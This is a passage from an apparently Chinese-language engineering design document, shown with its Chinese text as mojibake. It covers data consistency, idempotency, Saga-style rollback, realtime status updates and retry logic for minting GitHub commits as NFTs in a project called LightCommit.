      // å¤„ç†æ¯ä¸ªäº‹ä»¶
      for (const event of events) {
        const { tokenId, to, commit } = event.args;
        
        // æŸ¥æ‰¾å¯¹åº”çš„è´¡çŒ®
        const contribution = await ContributionRepository.findByGithubId(commit);
        
        if (contribution && contribution.status !== ContributionStatus.MINTED) {
          // æ›´æ–°æ•°æ®åº“
          await ContributionRepository.update(contribution.id, {
            status: ContributionStatus.MINTED,
            tokenId: tokenId.toString(),
            transactionHash: event.transactionHash,
          });
          
          console.log(`âœ… åŒæ­¥æˆåŠŸ: ${contribution.id} -> TokenID ${tokenId}`);
        }
      }
    }
    
    // æ›´æ–°åŒæ­¥ç‚¹
    await this.setLastSyncBlock(currentBlock);
  }
  
  // éªŒè¯æ•°æ®åº“ä¸­æ ‡è®°ä¸º minted çš„è®°å½•
  async validateMintedStatus() {
    // æŸ¥è¯¢æ‰€æœ‰ minted çŠ¶æ€çš„è´¡çŒ®
    const minted = await ContributionRepository.findAll({
      status: ContributionStatus.MINTED,
    });
    
    for (const contribution of minted) {
      if (!contribution.tokenId) {
        console.warn(`è´¡çŒ® ${contribution.id} æ ‡è®°ä¸º minted ä½†ç¼ºå°‘ tokenId`);
        continue;
      }
      
      try {
        // æ£€æŸ¥é“¾ä¸Šæ˜¯å¦çœŸçš„å­˜åœ¨è¿™ä¸ª NFT
        const owner = await contract.ownerOf(contribution.tokenId);
        
        // éªŒè¯ commit hash
        const commitData = await contract.getCommitData(contribution.tokenId);
        
        if (commitData.commit !== contribution.githubId) {
          console.error(`æ•°æ®ä¸åŒ¹é…: ${contribution.id}`);
          // æ ‡è®°ä¸ºéœ€è¦äººå·¥å®¡æ ¸
          await ContributionRepository.update(contribution.id, {
            metadata: {
              ...contribution.metadata,
              inconsistency: 'commit_hash_mismatch',
            },
          });
        }
        
      } catch (error) {
        // NFT ä¸å­˜åœ¨
        console.error(`NFT ${contribution.tokenId} ä¸å­˜åœ¨ï¼Œä½†æ•°æ®åº“æ ‡è®°ä¸º minted`);
        
        // å›æ»šçŠ¶æ€
        await ContributionRepository.update(contribution.id, {
          status: ContributionStatus.FAILED,
          tokenId: null,
        });
      }
    }
  }
  
  // æ¸…ç†é•¿æ—¶é—´ pending çš„äº¤æ˜“
  async cleanupStaleTransactions() {
    const minting = await ContributionRepository.findAll({
      status: ContributionStatus.MINTING,
    });
    
    const now = Date.now();
    const threshold = 24 * 60 * 60 * 1000;  // 24 å°æ—¶
    
    for (const contribution of minting) {
      const updatedAt = new Date(contribution.updatedAt).getTime();
      const elapsed = now - updatedAt;
      
      if (elapsed > threshold) {
        // è¶…è¿‡ 24 å°æ—¶ä»åœ¨ minting
        console.warn(`è´¡çŒ® ${contribution.id} é•¿æ—¶é—´å¤„äº minting çŠ¶æ€`);
        
        if (contribution.transactionHash) {
          // æ£€æŸ¥äº¤æ˜“çŠ¶æ€
          const receipt = await provider.getTransactionReceipt(contribution.transactionHash);
          
          if (receipt) {
            // äº¤æ˜“å·²ç¡®è®¤ï¼Œæ›´æ–°çŠ¶æ€
            const newStatus = receipt.status === 1 ? 
              ContributionStatus.MINTED : 
              ContributionStatus.FAILED;
            
            await ContributionRepository.update(contribution.id, {
              status: newStatus,
              tokenId: receipt.status === 1 ? parseTokenId(receipt) : null,
            });
          } else {
            // äº¤æ˜“ä¸å­˜åœ¨æˆ–ä»åœ¨ pendingï¼Œæ ‡è®°ä¸ºå¤±è´¥
            await ContributionRepository.update(contribution.id, {
              status: ContributionStatus.FAILED,
            });
          }
        } else {
          // æ²¡æœ‰ hashï¼Œç›´æ¥æ ‡è®°ä¸ºå¤±è´¥
          await ContributionRepository.update(contribution.id, {
            status: ContributionStatus.FAILED,
          });
        }
      }
    }
  }
  
  // å®šæœŸè¿è¡Œ
  async run() {
    setInterval(async () => {
      try {
        await this.checkInconsistencies();
      } catch (error) {
        console.error('ä¸€è‡´æ€§æ£€æŸ¥å¤±è´¥:', error);
      }
    }, 5 * 60 * 1000);  // æ¯ 5 åˆ†é’Ÿ
  }
}

// å¯åŠ¨ï¼š
const manager = new EventualConsistencyManager();
manager.run();
```

**æŒ‘æˆ˜ 5ï¼šå¹‚ç­‰æ€§ä¿è¯**

```typescript
// é—®é¢˜ï¼šç”¨æˆ·å¯èƒ½å¤šæ¬¡ç‚¹å‡»"é“¸é€ "æŒ‰é’®

// åœºæ™¯ï¼š
// 1. ç”¨æˆ·ç‚¹å‡»"é“¸é€  NFT"
// 2. äº¤æ˜“å‘é€ä¸­ï¼ˆç½‘ç»œæ…¢ï¼‰
// 3. ç”¨æˆ·ä»¥ä¸ºæ²¡ååº”ï¼Œå†æ¬¡ç‚¹å‡»
// 4. å‘é€äº†ä¸¤ç¬”äº¤æ˜“

// é˜²æŠ¤ Aï¼šå‰ç«¯é˜²æŠ–
function MintButton({ contributionId }) {
  const [isMinting, setIsMinting] = useState(false);
  
  const handleMint = async () => {
    if (isMinting) {
      toast.warning('é“¸é€ ä¸­ï¼Œè¯·å‹¿é‡å¤ç‚¹å‡»');
      return;  // â† é˜²æ­¢é‡å¤ç‚¹å‡»
    }
    
    setIsMinting(true);
    try {
      await mintContribution(contributionId);
    } finally {
      setIsMinting(false);
    }
  };
  
  return (
    <button onClick={handleMint} disabled={isMinting}>
      {isMinting ? 'é“¸é€ ä¸­...' : 'é“¸é€  NFT'}
    </button>
  );
}

// é˜²æŠ¤ Bï¼šåç«¯å¹‚ç­‰æ€§æ£€æŸ¥
export async function POST(request: NextRequest, { params }) {
  const { id } = await params;
  
  // 1. æ£€æŸ¥å½“å‰çŠ¶æ€
  const contribution = await ContributionRepository.findById(id);
  
  // 2. å¹‚ç­‰æ€§æ£€æŸ¥
  if (contribution.status === ContributionStatus.MINTED) {
    // å·²ç»é“¸é€ è¿‡ï¼Œç›´æ¥è¿”å›æˆåŠŸ
    return NextResponse.json({
      success: true,
      message: 'Already minted',
      tokenId: contribution.tokenId,
      transactionHash: contribution.transactionHash,
    });
  }
  
  if (contribution.status === ContributionStatus.MINTING) {
    // æ­£åœ¨é“¸é€ ä¸­
    if (contribution.transactionHash) {
      // è¿”å›äº¤æ˜“çŠ¶æ€ï¼Œè®©å‰ç«¯æŸ¥è¯¢
      return NextResponse.json({
        success: false,
        message: 'Minting in progress',
        transactionHash: contribution.transactionHash,
      }, { status: 409 });  // 409 Conflict
    }
  }
  
  // 3. ç»§ç»­é“¸é€ 
  const result = await mintContribution(id);
  return NextResponse.json(result);
}

// é˜²æŠ¤ Cï¼šåˆçº¦å±‚é˜²é‡å¤
contract CommitNFT {
  mapping(string => bool) private _mintedCommits;  // commit hash â†’ æ˜¯å¦å·²é“¸é€ 
  
  function mintCommit(address to, CommitData memory commitData, ...) external {
    // é˜²æ­¢åŒä¸€ä¸ª commit è¢«é“¸é€ ä¸¤æ¬¡
    require(!_mintedCommits[commitData.commit], "Commit already minted");
    
    // ...é“¸é€ é€»è¾‘...
    
    _mintedCommits[commitData.commit] = true;  // æ ‡è®°å·²é“¸é€ 
  }
}
```

**æŒ‘æˆ˜ 6ï¼šåˆ†å¸ƒå¼äº‹åŠ¡å¤„ç†**

```typescript
// åœºæ™¯ï¼šé“¸é€ æµç¨‹æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œéœ€è¦ä¿è¯åŸå­æ€§

async function mintWithMetadata(contributionId: string) {
  // æ­¥éª¤ 1ï¼šä¸Šä¼ å…ƒæ•°æ®åˆ° IPFS
  const metadataUri = await uploadToIPFS(contribution);
  
  // æ­¥éª¤ 2ï¼šæ›´æ–°æ•°æ®åº“
  await ContributionRepository.update(contributionId, {
    metadataUri,
  });
  
  // æ­¥éª¤ 3ï¼šè°ƒç”¨åˆçº¦é“¸é€ 
  const tx = await contract.mintCommit(to, commitData, metadataUri);
  
  // æ­¥éª¤ 4ï¼šç­‰å¾…ç¡®è®¤
  const receipt = await tx.wait();
  
  // æ­¥éª¤ 5ï¼šæ›´æ–°æ•°æ®åº“
  await ContributionRepository.update(contributionId, {
    status: ContributionStatus.MINTED,
    tokenId: parseTokenId(receipt),
  });
}

// é—®é¢˜ï¼šä»»ä¸€æ­¥éª¤å¤±è´¥ï¼Œéƒ½ä¼šå¯¼è‡´éƒ¨åˆ†å®Œæˆ
// - IPFS ä¸Šä¼ æˆåŠŸï¼Œä½†åˆçº¦è°ƒç”¨å¤±è´¥ â†’ IPFS æµªè´¹å­˜å‚¨
// - åˆçº¦æˆåŠŸï¼Œä½†æ•°æ®åº“æ›´æ–°å¤±è´¥ â†’ æ•°æ®ä¸ä¸€è‡´

// è§£å†³æ–¹æ¡ˆï¼šSaga æ¨¡å¼ï¼ˆè¡¥å¿äº‹åŠ¡ï¼‰
class MintSaga {
  private steps: Array<{
    forward: () => Promise<any>,
    backward: () => Promise<void>,
  }> = [];
  
  private completedSteps: any[] = [];
  
  async execute() {
    try {
      // é¡ºåºæ‰§è¡Œæ‰€æœ‰æ­¥éª¤
      for (const step of this.steps) {
        const result = await step.forward();
        this.completedSteps.push({ step, result });
      }
      
      return { success: true };
      
    } catch (error) {
      // å¤±è´¥ï¼Œæ‰§è¡Œè¡¥å¿ï¼ˆå›æ»šï¼‰
      console.error('Saga æ‰§è¡Œå¤±è´¥ï¼Œå¼€å§‹å›æ»š:', error);
      
      // é€†åºå›æ»šå·²å®Œæˆçš„æ­¥éª¤
      for (let i = this.completedSteps.length - 1; i >= 0; i--) {
        const { step } = this.completedSteps[i];
        try {
          await step.backward();
        } catch (rollbackError) {
          console.error('å›æ»šå¤±è´¥:', rollbackError);
        }
      }
      
      throw error;
    }
  }
}

// ä½¿ç”¨ Saga æ¨¡å¼é“¸é€ 
async function mintWithSaga(contributionId: string) {
  const saga = new MintSaga();
  
  let ipfsCid: string;
  let txHash: string;
  
  // æ­¥éª¤ 1ï¼šä¸Šä¼  IPFS
  saga.steps.push({
    forward: async () => {
      ipfsCid = await uploadToIPFS(contribution);
      return ipfsCid;
    },
    backward: async () => {
      // è¡¥å¿ï¼šä» IPFS åˆ é™¤ï¼ˆå¦‚æœæœåŠ¡æ”¯æŒï¼‰
      await unpinFromIPFS(ipfsCid);
    },
  });
  
  // æ­¥éª¤ 2ï¼šæ›´æ–°æ•°æ®åº“ï¼ˆè®°å½• metadataUriï¼‰
  saga.steps.push({
    forward: async () => {
      await ContributionRepository.update(contributionId, {
        metadataUri: `ipfs://${ipfsCid}`,
      });
    },
    backward: async () => {
      // è¡¥å¿ï¼šæ¸…ç©º metadataUri
      await ContributionRepository.update(contributionId, {
        metadataUri: null,
      });
    },
  });
  
  // æ­¥éª¤ 3ï¼šå‘é€äº¤æ˜“
  saga.steps.push({
    forward: async () => {
      const tx = await contract.mintCommit(to, commitData, `ipfs://${ipfsCid}`);
      txHash = tx.hash;
      
      // æ›´æ–°çŠ¶æ€
      await ContributionRepository.update(contributionId, {
        status: ContributionStatus.MINTING,
        transactionHash: txHash,
      });
      
      return tx;
    },
    backward: async () => {
      // è¡¥å¿ï¼šæ ‡è®°ä¸ºå¤±è´¥ï¼ˆäº¤æ˜“æ— æ³•æ’¤é”€ï¼‰
      await ContributionRepository.update(contributionId, {
        status: ContributionStatus.FAILED,
      });
    },
  });
  
  // æ­¥éª¤ 4ï¼šç­‰å¾…ç¡®è®¤
  saga.steps.push({
    forward: async () => {
      const tx = this.completedSteps[2].result;
      const receipt = await tx.wait();
      
      if (receipt.status !== 1) {
        throw new Error('Transaction reverted');
      }
      
      return receipt;
    },
    backward: async () => {
      // æ— éœ€è¡¥å¿ï¼ˆäº¤æ˜“å·²ç¡®è®¤ï¼‰
    },
  });
  
  // æ­¥éª¤ 5ï¼šæ›´æ–°æœ€ç»ˆçŠ¶æ€
  saga.steps.push({
    forward: async () => {
      const receipt = this.completedSteps[3].result;
      const tokenId = parseTokenId(receipt);
      
      await ContributionRepository.update(contributionId, {
        status: ContributionStatus.MINTED,
        tokenId,
      });
    },
    backward: async () => {
      // æ— éœ€è¡¥å¿
    },
  });
  
  // æ‰§è¡Œ Saga
  return await saga.execute();
}
```

---

### 2.4 å®æ—¶çŠ¶æ€é€šçŸ¥é—®é¢˜

#### é—®é¢˜æè¿°

ç”¨æˆ·å‘èµ·é“¸é€ åï¼Œå¦‚ä½•å®æ—¶è·çŸ¥äº¤æ˜“è¿›å±•ï¼Ÿ

#### è§£å†³æ–¹æ¡ˆ

**æ–¹æ¡ˆ Aï¼šè½®è¯¢ï¼ˆPollingï¼‰**

```typescript
// å‰ç«¯å®šæœŸæŸ¥è¯¢çŠ¶æ€
function useMintStatus(contributionId: string) {
  const [status, setStatus] = useState<ContributionStatus>(ContributionStatus.PENDING);
  
  useEffect(() => {
    if (status === ContributionStatus.MINTING) {
      // æ¯ 3 ç§’æŸ¥è¯¢ä¸€æ¬¡
      const interval = setInterval(async () => {
        const contribution = await fetch(`/api/contributions/${contributionId}`).then(r => r.json());
        
        setStatus(contribution.status);
        
        // å¦‚æœå·²å®Œæˆï¼ˆæˆåŠŸæˆ–å¤±è´¥ï¼‰ï¼Œåœæ­¢è½®è¯¢
        if (contribution.status === ContributionStatus.MINTED || 
            contribution.status === ContributionStatus.FAILED) {
          clearInterval(interval);
        }
      }, 3000);
      
      return () => clearInterval(interval);
    }
  }, [status, contributionId]);
  
  return status;
}

// ä¼˜ç‚¹ï¼šç®€å•ï¼Œä¸éœ€è¦é¢å¤–æœåŠ¡
// ç¼ºç‚¹ï¼šå»¶è¿Ÿé«˜ï¼ˆæœ€å¤š 3 ç§’ï¼‰ï¼ŒæœåŠ¡å™¨å‹åŠ›å¤§
```

**æ–¹æ¡ˆ Bï¼šWebSocket / Server-Sent Eventsï¼ˆSSEï¼‰**

```typescript
// åç«¯ï¼šSSE ç«¯ç‚¹
// app/api/contributions/[id]/status-stream/route.ts
export async function GET(request: NextRequest, { params }) {
  const { id } = await params;
  
  // åˆ›å»º SSE æµ
  const encoder = new TextEncoder();
  const stream = new ReadableStream({
    async start(controller) {
      // å‘é€åˆå§‹çŠ¶æ€
      const contribution = await ContributionRepository.findById(id);
      controller.enqueue(encoder.encode(`data: ${JSON.stringify(contribution)}\n\n`));
      
      // ç›‘å¬çŠ¶æ€å˜åŒ–ï¼ˆæ¯ç§’æ£€æŸ¥ï¼‰
      const interval = setInterval(async () => {
        const updated = await ContributionRepository.findById(id);
        
        // çŠ¶æ€å˜åŒ–ï¼Œå‘é€æ›´æ–°
        if (updated.status !== contribution.status) {
          controller.enqueue(encoder.encode(`data: ${JSON.stringify(updated)}\n\n`));
          
          // å¦‚æœå·²å®Œæˆï¼Œå…³é—­æµ
          if (updated.status === ContributionStatus.MINTED || 
              updated.status === ContributionStatus.FAILED) {
            clearInterval(interval);
            controller.close();
          }
        }
      }, 1000);
      
      // æ¸…ç†
      request.signal.addEventListener('abort', () => {
        clearInterval(interval);
        controller.close();
      });
    },
  });
  
  return new Response(stream, {
    headers: {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
    },
  });
}

// å‰ç«¯ï¼šç›‘å¬ SSE
function useMintStatusSSE(contributionId: string) {
  const [status, setStatus] = useState<Contribution | null>(null);
  
  useEffect(() => {
    const eventSource = new EventSource(`/api/contributions/${contributionId}/status-stream`);
    
    eventSource.onmessage = (event) => {
      const contribution = JSON.parse(event.data);
      setStatus(contribution);
    };
    
    eventSource.onerror = (error) => {
      console.error('SSE é”™è¯¯:', error);
      eventSource.close();
    };
    
    return () => eventSource.close();
  }, [contributionId]);
  
  return status;
}

// ä¼˜ç‚¹ï¼šå®æ—¶æ€§é«˜ï¼ŒæœåŠ¡å™¨ä¸»åŠ¨æ¨é€
// ç¼ºç‚¹ï¼šéœ€è¦ä¿æŒè¿æ¥ï¼ŒæœåŠ¡å™¨èµ„æºæ¶ˆè€—å¤§
```

**æ–¹æ¡ˆ Cï¼šSupabase Realtimeï¼ˆæ¨èï¼‰**

```typescript
// åˆ©ç”¨ Supabase çš„å®æ—¶è®¢é˜…åŠŸèƒ½

// å‰ç«¯ï¼šè®¢é˜…è´¡çŒ®è¡¨çš„å˜åŒ–
import { supabase } from '@/lib/supabase/client';

function useMintStatusRealtime(contributionId: string) {
  const [contribution, setContribution] = useState<Contribution | null>(null);
  
  useEffect(() => {
    // è®¢é˜…ç‰¹å®šè´¡çŒ®çš„å˜åŒ–
    const channel = supabase
      .channel(`contribution-${contributionId}`)
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',                    // ç›‘å¬ UPDATE äº‹ä»¶
          schema: 'public',
          table: 'contributions',
          filter: `id=eq.${contributionId}`,  // åªç›‘å¬è¿™ä¸ªè´¡çŒ®
        },
        (payload) => {
          console.log('è´¡çŒ®çŠ¶æ€æ›´æ–°:', payload.new);
          setContribution(payload.new as Contribution);
          
          // å¦‚æœçŠ¶æ€å˜ä¸º mintedï¼Œæ˜¾ç¤ºé€šçŸ¥
          if (payload.new.status === 'minted') {
            toast.success(`NFT é“¸é€ æˆåŠŸï¼TokenID: ${payload.new.tokenId}`);
          }
        }
      )
      .subscribe();
    
    return () => {
      supabase.removeChannel(channel);
    };
  }, [contributionId]);
  
  return contribution;
}

// ä½¿ç”¨ï¼š
function MintProgress({ contributionId }) {
  const contribution = useMintStatusRealtime(contributionId);
  
  if (!contribution) return <Spinner />;
  
  return (
    <div>
      <p>çŠ¶æ€: {contribution.status}</p>
      {contribution.status === ContributionStatus.MINTING && (
        <p>äº¤æ˜“å“ˆå¸Œ: {contribution.transactionHash}</p>
      )}
      {contribution.status === ContributionStatus.MINTED && (
        <p>TokenID: {contribution.tokenId}</p>
      )}
    </div>
  );
}

// ä¼˜ç‚¹ï¼š
// - âœ… å®æ—¶æ€§é«˜ï¼ˆæ¯«ç§’çº§ï¼‰
// - âœ… æœåŠ¡å™¨èµ„æºæ¶ˆè€—ä½ï¼ˆSupabase å¤„ç†ï¼‰
// - âœ… æ–­çº¿è‡ªåŠ¨é‡è¿
// - âœ… æ”¯æŒå¤šä¸ªå®¢æˆ·ç«¯åŒæ­¥

// ç¼ºç‚¹ï¼š
// - ä¾èµ– Supabaseï¼ˆæœ¬é¡¹ç›®å·²ä½¿ç”¨ï¼‰
```

---

### 2.5 é”™è¯¯æ¢å¤ä¸é‡è¯•æœºåˆ¶

#### é—®é¢˜æè¿°

é“¸é€ æµç¨‹ä»»ä¸€ç¯èŠ‚å¤±è´¥ï¼Œå¦‚ä½•è‡ªåŠ¨æ¢å¤æˆ–å¼•å¯¼ç”¨æˆ·é‡è¯•ï¼Ÿ

#### è§£å†³æ–¹æ¡ˆ

**æ–¹æ¡ˆ Aï¼šè‡ªåŠ¨é‡è¯•ï¼ˆæŒ‡æ•°é€€é¿ï¼‰**

```typescript
// å¸¦é‡è¯•çš„é“¸é€ å‡½æ•°
async function mintWithRetry(
  contributionId: string,
  maxRetries = 3,
  baseDelay = 1000,
) {
  let lastError: Error;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      // å°è¯•é“¸é€ 
      const result = await mintContribution(contributionId);
      return result;  // æˆåŠŸï¼Œè¿”å›
      
    } catch (error) {
      lastError = error as Error;
      console.error(`é“¸é€ å¤±è´¥ï¼ˆå°è¯• ${attempt + 1}/${maxRetries}ï¼‰:`, error);
      
      // åˆ¤æ–­æ˜¯å¦åº”è¯¥é‡è¯•
      if (isRetryableError(error)) {
        // å¯é‡è¯•é”™è¯¯ï¼ˆç½‘ç»œé—®é¢˜ã€RPC è¶…æ—¶ç­‰ï¼‰
        
        if (attempt < maxRetries - 1) {
          // æŒ‡æ•°é€€é¿ï¼š1s, 2s, 4s, 8s...
          const delay = baseDelay * Math.pow(2, attempt);
          console.log(`${delay}ms åé‡è¯•...`);
          await new Promise(resolve => setTimeout(resolve, delay));
          continue;
        }
      } else {
        // ä¸å¯é‡è¯•é”™è¯¯ï¼ˆä½™é¢ä¸è¶³ã€åˆçº¦ revert ç­‰ï¼‰
        throw error;
      }
    }
  }
  
  // æ‰€æœ‰é‡è¯•éƒ½å¤±è´¥
  throw new Error(`é“¸é€ å¤±è´¥ï¼Œå·²é‡è¯• ${maxRetries} æ¬¡: ${lastError.message}`);
}

// åˆ¤æ–­æ˜¯å¦å¯é‡è¯•
function isRetryableError(error: any): boolean {
  const retryableErrors = [
    'network',              // ç½‘ç»œé”™è¯¯
    'timeout',              // è¶…æ—¶
    'server error',         // RPC æœåŠ¡å™¨é”™è¯¯
    'nonce too low',        // Nonce å†²çªï¼ˆå¯èƒ½æ˜¯å¹¶å‘å¯¼è‡´ï¼‰
    'replacement fee too low',  // æ›¿æ¢äº¤æ˜“ Gas å¤ªä½
  ];
  
  const errorMessage = error.message?.toLowerCase() || '';
  return retryableErrors.some(keyword => errorMessage.includes(keyword));
}

// ä¸å¯é‡è¯•çš„é”™è¯¯ï¼š
const nonRetryableErrors = [
  'insufficient funds',   // ä½™é¢ä¸è¶³ï¼ˆéœ€è¦ç”¨æˆ·å……å€¼ï¼‰
  'already minted',       // å·²é“¸é€ ï¼ˆå¹‚ç­‰æ€§ï¼‰
  'user rejected',        // ç”¨æˆ·å–æ¶ˆï¼ˆä¸åº”è¯¥è‡ªåŠ¨é‡è¯•ï¼‰
  'invalid signature',    // ç­¾åé”™è¯¯ï¼ˆæ•°æ®é—®é¢˜ï¼‰
];
```

**æ–¹æ¡ˆ Bï¼šç”¨æˆ·æ‰‹åŠ¨é‡è¯• + æ–­ç‚¹ç»­ä¼ **

```typescript
// è®°å½•é“¸é€ è¿›åº¦ï¼Œå¤±è´¥åå¯ä»¥ä»æ–­ç‚¹ç»§ç»­

interface MintProgress {
  contributionId: string;
  step: 'ipfs' | 'database' | 'transaction' | 'confirmation' | 'complete';
  data: {
    metadataUri?: string;
    transactionHash?: string;
    tokenId?: string;
  };
  error?: string;
}

// ä¿å­˜è¿›åº¦åˆ°æ•°æ®åº“
async function saveMintProgress(progress: MintProgress) {
  await ContributionRepository.update(progress.contributionId, {
    metadata: {
      ...contribution.metadata,
      mintProgress: progress,
    },
  });
}

// ä»æ–­ç‚¹ç»§ç»­
async function resumeMint(contributionId: string) {
  const contribution = await ContributionRepository.findById(contributionId);
  const progress = contribution.metadata?.mintProgress as MintProgress;
  
  if (!progress) {
    // ä»å¤´å¼€å§‹
    return await mintContribution(contributionId);
  }
  
  // æ ¹æ®ä¸Šæ¬¡çš„è¿›åº¦ç»§ç»­
  switch (progress.step) {
    case 'ipfs':
      // IPFS ä¸Šä¼ å¤±è´¥ï¼Œé‡æ–°ä¸Šä¼ 
      const metadataUri = await uploadToIPFS(contribution);
      await saveMintProgress({ ...progress, step: 'database', data: { metadataUri } });
      // ç»§ç»­ä¸‹ä¸€æ­¥...
      
    case 'database':
      // æ•°æ®åº“æ›´æ–°å¤±è´¥ï¼Œé‡è¯•
      await ContributionRepository.update(contributionId, {
        metadataUri: progress.data.metadataUri,
      });
      await saveMintProgress({ ...progress, step: 'transaction' });
      // ç»§ç»­ä¸‹ä¸€æ­¥...
      
    case 'transaction':
      // äº¤æ˜“å‘é€å¤±è´¥ï¼Œé‡æ–°å‘é€
      const tx = await contract.mintCommit(to, commitData, progress.data.metadataUri);
      await saveMintProgress({ ...progress, step: 'confirmation', data: { ...progress.data, transactionHash: tx.hash } });
      // ç»§ç»­ä¸‹ä¸€æ­¥...
      
    case 'confirmation':
      // ç­‰å¾…ç¡®è®¤å¤±è´¥ï¼Œé‡æ–°ç­‰å¾…
      const receipt = await provider.getTransactionReceipt(progress.data.transactionHash);
      if (receipt) {
        const tokenId = parseTokenId(receipt);
        await saveMintProgress({ ...progress, step: 'complete', data: { ...progress.data, tokenId } });
      }
      break;
      
    case 'complete':
      // å·²å®Œæˆ
      return { success: true };
  }
}

// å‰ç«¯ï¼šæ˜¾ç¤ºè¿›åº¦
function MintProgressBar({ contributionId }) {
  const contribution = useContribution(contributionId);
  const progress = contribution?.metadata?.mintProgress;
  
  const steps = [
    { key: 'ipfs', label: 'ä¸Šä¼ å…ƒæ•°æ®', percentage: 20 },
    { key: 'database', label: 'æ›´æ–°æ•°æ®åº“', percentage: 40 },
    { key: 'transaction', label: 'å‘é€äº¤æ˜“', percentage: 60 },
    { key: 'confirmation', label: 'ç­‰å¾…ç¡®è®¤', percentage: 80 },
    { key: 'complete', label: 'å®Œæˆ', percentage: 100 },
  ];
  
  const currentStep = steps.find(s => s.key === progress?.step);
  const percentage = currentStep?.percentage || 0;
  
  return (
    <div>
      <ProgressBar value={percentage} />
      <p>{currentStep?.label}</p>
      
      {progress?.error && (
        <div>
          <p className="text-red-500">é”™è¯¯: {progress.error}</p>
          <button onClick={() => resumeMint(contributionId)}>
            ä»æ–­ç‚¹ç»§ç»­
          </button>
        </div>
      )}
    </div>
  );
}
```

---

### 2.6 æ€»ç»“ä¸æœ€ä½³å®è·µ

#### è®¾è®¡åŸåˆ™

1. **é“¾ä¸Šä¸ºå‡†**ï¼šé“¾ä¸ŠçŠ¶æ€æ˜¯çœŸå®çŠ¶æ€ï¼Œæ•°æ®åº“æ˜¯ç¼“å­˜
2. **ç«‹å³è®°å½• Hash**ï¼šäº¤æ˜“å‘é€åç«‹å³è®°å½• `transactionHash`
3. **å»¶è¿Ÿç¡®è®¤**ï¼šç­‰å¾…è¶³å¤Ÿçš„ç¡®è®¤æ•°ï¼ˆä¸»ç½‘ 12 ä¸ªï¼Œæµ‹è¯•ç½‘ 6 ä¸ªï¼‰
4. **å®šæ—¶åŒæ­¥**ï¼šåå°ä»»åŠ¡å®šæœŸæ£€æŸ¥ä¸ä¸€è‡´
5. **å¹‚ç­‰æ€§**ï¼šæ‰€æœ‰æ“ä½œæ”¯æŒé‡å¤æ‰§è¡Œ

#### æ¨èæ¶æ„

```typescript
// 1. å‰ç«¯å‘èµ·é“¸é€ 
const { mutate: mint } = useMutation({
  mutationFn: (id) => fetch(`/api/contributions/${id}/mint`, { method: 'POST' }),
});

// 2. åç«¯å¤„ç†è¯·æ±‚ï¼ˆå‘é€äº¤æ˜“ï¼‰
export async function POST(request, { params }) {
  const tx = await contract.mintCommit(...);
  
  // ç«‹å³è¿”å›ï¼ˆä¸ç­‰å¾…ç¡®è®¤ï¼‰
  return NextResponse.json({
    success: true,
    transactionHash: tx.hash,
    message: 'äº¤æ˜“å·²å‘é€ï¼Œè¯·ç­‰å¾…ç¡®è®¤',
  });
}

// 3. åå°ä»»åŠ¡ç›‘å¬äº‹ä»¶
contract.on('CommitMinted', async (tokenId, to, repo, commit) => {
  const contribution = await ContributionRepository.findByGithubId(commit);
  if (contribution) {
    await ContributionRepository.update(contribution.id, {
      status: ContributionStatus.MINTED,
      tokenId: tokenId.toString(),
    });
  }
});

// 4. å‰ç«¯å®æ—¶è®¢é˜…
const contribution = useMintStatusRealtime(contributionId);

// 5. å®šæ—¶ä»»åŠ¡å…œåº•
setInterval(syncBlockchainState, 5 * 60 * 1000);
```

è¿™æ ·çš„æ¶æ„èƒ½å¤Ÿæœ€å¤§ç¨‹åº¦ä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼ŒåŒæ—¶æä¾›è‰¯å¥½çš„ç”¨æˆ·ä½“éªŒï¼

---

## ä¸‰ã€åŒºå—é“¾äº¤äº’é—®é¢˜ â›“ï¸

### 3.1 Gas è´¹ç”¨ä¼˜åŒ–é—®é¢˜
### 3.2 äº¤æ˜“å¤±è´¥å¤„ç†
### 3.3 è·¨åˆçº¦è°ƒç”¨æƒé™
### 3.4 ç½‘ç»œå…¼å®¹æ€§

---

## å››ã€è¯„åˆ†ç³»ç»Ÿé—®é¢˜ ğŸ“Š

### 4.1 è¯„åˆ†è§„åˆ™çš„ä¸»è§‚æ€§
### 4.2 è¯„åˆ†æ•°æ®æ¥æºé—®é¢˜
### 4.3 è¯„åˆ†å…¬å¹³æ€§ä¿è¯
### 4.4 è¯„åˆ†ç»“æœçš„å¯ä¿¡åº¦

---

## äº”ã€IPFS å…ƒæ•°æ®å­˜å‚¨é—®é¢˜ ğŸ“¦

### 5.1 ä¸Šä¼ å¯é æ€§
### 5.2 å…ƒæ•°æ®è®¿é—®æ€§èƒ½
### 5.3 å…ƒæ•°æ®æŒä¹…æ€§

---

## å…­ã€å‰ç«¯çŠ¶æ€ç®¡ç†é—®é¢˜ ğŸ¨

### 6.1 å¤šæ•°æ®æºæ•´åˆé—®é¢˜

#### é—®é¢˜æè¿°

LightCommit çš„å‰ç«¯æ•°æ®æ¥è‡ªå¤šä¸ªä¸åŒçš„æºï¼Œæ¯ä¸ªæºæœ‰ä¸åŒçš„ç‰¹æ€§å’Œæ›´æ–°æœºåˆ¶ï¼š

| æ•°æ®æº | æ•°æ®ç±»å‹ | æ›´æ–°é¢‘ç‡ | ç¼“å­˜ç­–ç•¥ |
|-------|---------|---------|---------|
| **Supabase** | è´¡çŒ®åˆ—è¡¨ã€ç”¨æˆ·ä¿¡æ¯ | å®æ—¶æ›´æ–° | React Query 5 åˆ†é’Ÿ |
| **åŒºå—é“¾ï¼ˆRPCï¼‰** | NFT çŠ¶æ€ã€åˆçº¦æ•°æ® | åŒºå—ç¡®è®¤å | æ— ç¼“å­˜ï¼ˆæ¯æ¬¡æŸ¥è¯¢ï¼‰ |
| **GitHub API** | ä»“åº“ã€æäº¤è¯¦æƒ… | ç›¸å¯¹é™æ€ | å¯é•¿æœŸç¼“å­˜ |
| **IPFS** | NFT å…ƒæ•°æ® | ä¸å¯å˜ | æ°¸ä¹…ç¼“å­˜ |
| **æœ¬åœ°çŠ¶æ€** | UI äº¤äº’çŠ¶æ€ | å®æ—¶ | ç»„ä»¶å†…å­˜ |

#### å…·ä½“æŒ‘æˆ˜

**æŒ‘æˆ˜ 1ï¼šReact Query ç¼“å­˜ä¸é“¾ä¸Šæ•°æ®å†²çª**

```typescript
